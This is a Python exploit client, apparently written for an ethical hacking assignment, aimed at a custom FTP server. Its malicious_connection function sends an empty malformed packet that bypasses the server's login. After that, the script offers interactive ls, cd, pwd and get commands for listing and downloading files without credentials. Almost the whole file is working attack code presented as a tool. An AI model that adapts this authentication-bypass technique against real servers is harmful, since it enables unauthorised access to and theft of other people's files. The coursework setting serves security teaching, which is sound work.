import struct, os
import socket as sock
import argparse

# Define packet types (based on enum in protocol.h)
PROTOCOL_PCK_TYPE_NULL = 0
PROTOCOL_PCK_TYPE_MSG = 1
PROTOCOL_PCK_TYPE_MSG_RESPONSE = 2
PROTOCOL_PCK_TYPE_MSG_FAILURE = 3
PROTOCOL_PCK_TYPE_MSG_SUCCESS = 4
PROTOCOL_PCK_TYPE_MSG_CANCELLED = 5
PROTOCOL_PCK_TYPE_COMMAND_LS = 6
PROTOCOL_PCK_TYPE_COMMAND_GET = 7
PROTOCOL_PCK_TYPE_COMMAND_PUT = 8
PROTOCOL_PCK_TYPE_COMMAND_PWD = 9
PROTOCOL_PCK_TYPE_COMMAND_CD = 10
PROTOCOL_PCK_TYPE_COMMAND_MKDIR = 11
PROTOCOL_PCK_TYPE_COMMAND_RMDIR = 12
PROTOCOL_PCK_TYPE_RESPONSE_NOEMPTY = 13
PROTOCOL_PCK_TYPE_RESPONSE_YES = 14
PROTOCOL_PCK_TYPE_RESPONSE_NO = 15
PROTOCOL_PCK_TYPE_RESPONSE_LS = 16
PROTOCOL_PCK_TYPE_RESPONSE_PWD = 17
PROTOCOL_PCK_TYPE_RESPONSE_CD = 18
PROTOCOL_PCK_TYPE_EXIT = 19
PROTOCOL_PCK_TYPE_FILE_SENDING = 20
PROTOCOL_PCK_TYPE_FILE_SIZE = 21
PROTOCOL_PCK_TYPE_FILE_FAILURE = 22
PROTOCOL_PCK_TYPE_FILE_LISTENING = 23
PROTOCOL_PCK_TYPE_AUTH_REQUEST = 24
PROTOCOL_PCK_TYPE_AUTH_RESPONSE = 25
PROTOCOL_PCK_TYPE_AUTH_SUCCESS = 26
PROTOCOL_PCK_TYPE_AUTH_FAILURE = 27
PROTOCOL_PCK_TYPE_UNEXPECTED_PACKET = 28
PROTOCOL_PCK_TYPE_UNEXPECTED_DATA_SIZE = 29
PROTOCOL_PCK_TYPE_HELP = 30
PROTOCOL_PCK_TYPE_WRONG_SYNTAX = 31

IP_PORT = ''

# Use the malicious packet
def malicious_connection():
  empty_packet = struct.pack('!ii', 0, 0)
  socket = sock.socket(sock.AF_INET, sock.SOCK_STREAM)

  try:
    socket.connect(IP_PORT)
  except ConnectionRefusedError:
    print("Could not connect, please check the ip addr and port of the server!")
    exit(-1)
  except OSError:
    print("Cannot connect the machine to the server. Please check your network connections")
    exit(-1)

  response_data = socket.recv(1024).decode('utf-8') # Recieving "Please print a valid username and password"

  # Sending malformed packet
  socket.sendall(empty_packet)
  response_data = socket.recv(1024).decode('utf-8') # Recieving "Unexpected packet"
  response_data = socket.recv(1024).decode('utf-8') # Recieving "Creating thing for users!"

  if "Creating thing for users!" not in response_data:
    print(f"Injection failed! Response data: {response_data}")
    socket.close()
    exit(-1)
  
  print("Login succesfully bypassed")
  return socket

def ls_packet(socket : sock, verbose=True):
  # Sending packet:
  socket.sendall(struct.pack('<iQ', PROTOCOL_PCK_TYPE_COMMAND_LS, len(b'')) + ''.encode("utf-8"))

  # Recieving packet:
  packet_type = int.from_bytes(socket.recv(4), byteorder='little') # Getting the int size -> Type of packet (littel endian)
  data_size = int.from_bytes(socket.recv(4), byteorder='big')

  if packet_type != PROTOCOL_PCK_TYPE_RESPONSE_LS:
    if verbose: print(f"Unexcpected response! Error: {packet_type}")
    return
  
  data = socket.recv(int(data_size) - 1).decode()
  if verbose: print(f"'ls' command result:\n{data}")
  return data

def get_packet(socket : sock):
  # Sending packets:
  filename = input('Select remote path: ')
  data = f"{filename}".encode('utf-8')
  size = struct.pack('I', len(data))

  socket.sendall(struct.pack('<iQ', PROTOCOL_PCK_TYPE_COMMAND_GET, len(data) + len(size)) + size + data)

  # Recieving packet:
  packet_type = int.from_bytes(socket.recv(4), byteorder='little') # Getting the int size -> Type of packet (littel endian)
  data_size = int.from_bytes(socket.recv(8), byteorder='little')
  data = socket.recv(data_size) # Which is the filename

  if packet_type == PROTOCOL_PCK_TYPE_FILE_SENDING:
    print(f"Recieving file {filename} ....")
    
    packet_type = int.from_bytes(socket.recv(4), byteorder='little')
    data_size = int.from_bytes(socket.recv(8), byteorder='little')
    file_size = int.from_bytes(socket.recv(data_size), byteorder='little')

    if packet_type != PROTOCOL_PCK_TYPE_FILE_SIZE:
      print("Error! Unexpected packet recieved")
      # Closing socket
      close_connection(socket)
      exit(-1)
      
    print(f"File size: {file_size}")
    download_filename = f'{filename}_download.temp'
    file = open(download_filename, 'wb')

    bytes_received = 0
    while bytes_received < file_size:
      buffer = socket.recv(min(1024, file_size - bytes_received))
      file.write(buffer)

      bytes_received += len(buffer)
    
    file.close()
    os.rename(download_filename, download_filename[:download_filename.rfind('.')])
    print("Download finished....")
    return
  
  elif packet_type == PROTOCOL_PCK_TYPE_FILE_FAILURE:
    print("File failure, exiting...")
    return
  else:
    print(f"Unexcpected packet recieved. Error: {packet_type}")
    return

def cd_packet(socket : sock):
  data = f'{input("Select the folder to move into with cd: ")}'.encode('utf-8')
  socket.sendall(struct.pack('<iQ', PROTOCOL_PCK_TYPE_COMMAND_CD, len(data)) + data)

  packet_type = int.from_bytes(socket.recv(4), byteorder='little') # Getting the int size -> Type of packet (littel endian)
  data_size = int.from_bytes(socket.recv(4), byteorder='big')
  data = socket.recv(data_size).decode("utf-8")
  
  if packet_type != PROTOCOL_PCK_TYPE_RESPONSE_CD:
    print("Cannot exit out of the sharedfolder!")
    return
  
  if "Error" in data:
    print("Cannot change directory. General error occured")
  else:
    print("Change directory succesfully")

def close_connection(socket : sock):
  socket.sendall(struct.pack('<iQ', PROTOCOL_PCK_TYPE_EXIT, len(b'')) + ''.encode("utf-8"))
  socket.close()

def pwd_packet(socket : sock, verbose = True):
  socket.sendall(struct.pack('<iQ', PROTOCOL_PCK_TYPE_COMMAND_PWD, len(b'')) + ''.encode("utf-8"))

  # Recieving packet:
  packet_type = int.from_bytes(socket.recv(4), byteorder='little') # Getting the int size -> Type of packet (littel endian)
  data_size = int.from_bytes(socket.recv(4), byteorder='big')

  if packet_type != PROTOCOL_PCK_TYPE_RESPONSE_PWD:
    if verbose: print(f"Unexcpected response! Error: {packet_type}")
    return
  
  data = socket.recv(int(data_size) - 1).decode()
  if verbose: print(f"Current remote folder:  {data}")
  return data

def main():
  if IP_PORT == '':
    print("Error in argument parsing!")
    exit(-1)
  
  # Send malicious packets: byass security
  socket = malicious_connection()

  # The response is "Creating thing for users!", sent after the login phase
  sel = ''
  while True:
    print("-"*os.get_terminal_size().columns)
    print('Select one of the following options: ')
    print("1) LS command\n2) CD command\n3) GET command\n4) PWD command\n5) Clear terminal\n9) Quit")
    try: 
      sel = int(input("Selection: "))
    except ValueError:
      print("The data given could not be interpreted as an integer. Please, retry")
      continue

    if sel < 1 or (sel > 5 and sel < 9) or sel > 9:
      print("The selected value cannot be accepted, please retry")
      continue

    if sel == 1: ls_packet(socket) # PROTOCOL_PCK_TYPE_COMMAND_LS
    elif sel == 2: # PROTOCOL_PCK_TYPE_COMMAND_CD
      cd_packet(socket)
      continue
    elif sel == 3: # PROTOCOL_PCK_TYPE_COMMAND_GET
      get_packet(socket)
      continue
    elif sel == 4: # PROTOCOL_PCK_TYPE_COMMAND_PWD
      pwd_packet(socket)
      continue
    elif sel == 5:
      os.system('cls' if os.name == 'nt' else 'clear')
      continue
    elif sel == 9: # PROTOCOL_PCK_TYPE_EXIT
      close_connection(socket)
      return

if __name__ == "__main__":
  parser = argparse.ArgumentParser(
    prog='python3 ./ftp_client.py',
    description='Client for FTP server in ethical hacking assignment.',
    epilog='This program function as a client for a custom FTP server and levareges a mistake to bypass login. If unspecified, the ip defaults to localhost and the port defaults to 8081')
  
  parser.add_argument('-ip', default="127.0.0.1", help='The Ip address of the server')
  parser.add_argument('-p', '--port', default=8081, type=int, help="The port where the FTP server is listening")

  args = parser.parse_args()
  IP_PORT = ((args.ip, args.port))
  main()
